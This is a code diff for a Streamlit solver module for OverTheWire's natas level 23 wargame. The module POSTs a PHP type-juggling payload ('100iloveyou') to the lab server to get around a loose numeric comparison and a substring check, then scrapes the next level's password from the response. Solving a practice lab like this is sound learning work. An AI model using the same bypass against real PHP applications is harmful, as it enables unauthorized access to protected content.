@@ -4,32 +4,28 @@ import re
 def run(context, session, base_url):
     st.info("Targeting PHP Numeric Type Juggling & Substring Matching Vulnerabilities...")
     
-    # 1. Safely extract credentials without throwing a KeyError
+    # 1. Align credentials cleanly using the correct target user
     username = "natas23"
-    
-    # Try multiple common key names from your dashboard context dictionary
-    current_password = (
-        context.get('password') or 
-        context.get('current_password') or 
-        context.get('lvl22_password') or 
-        ""
-    ).strip()
-    
+    current_password = context.get('password', '').strip()
     session.auth = (username, current_password)
     
-    # 2. Craft the exploit payload mixing leading digits with required sub-string markers
-    payload_data = {"passwd": "11iloveyou"}
-    st.write(f"📡 Sending parameter payload: `{payload_data}`")
+    # Explicitly target the correct endpoint URL path
+    target_url = "http://natas23.natas.labs.overthewire.org/index.php"
+    st.write(f"🌐 Explicitly routing payload to: `{target_url}`")
+    
+    # 2. Craft the type-juggling exploit payload
+    # '100' satisfies the (> 10) condition, 'iloveyou' satisfies the strstr requirement
+    payload_data = {"passwd": "100iloveyou"}
+    st.write(f"📡 Transmitting payload parameters: `{payload_data}`")
     
     try:
-        # Transmit target parameters via POST
-        response = session.post(base_url, data=payload_data, timeout=10)
+        response = session.post(target_url, data=payload_data, timeout=10)
         
-        # 3. Process response text for secret token content
-        if "The password for natas24 is" in response.text:
+        # 3. Process the server's response text matching criteria
+        if "The credentials for the next level are" in response.text:
             st.success("🎯 PHP loose comparison condition bypassed successfully!")
             
-            # Find all 32/64 character alphanumeric strings on the page
+            # Find all valid token hashes on the page canvas
             all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
             new_tokens = [t for t in all_tokens if t != current_password]
             
@@ -41,7 +37,7 @@ def run(context, session, base_url):
                 with st.expander("Examine Page Content Output"):
                     st.code(response.text, language="html")
         else:
-            st.error("The server rejected the payload alignment. Verify your input credentials match Level 22.")
+            st.error("The server rejected the payload alignment.")
             with st.expander("Examine Page Response State"):
                 st.code(response.text, language="html")
                 
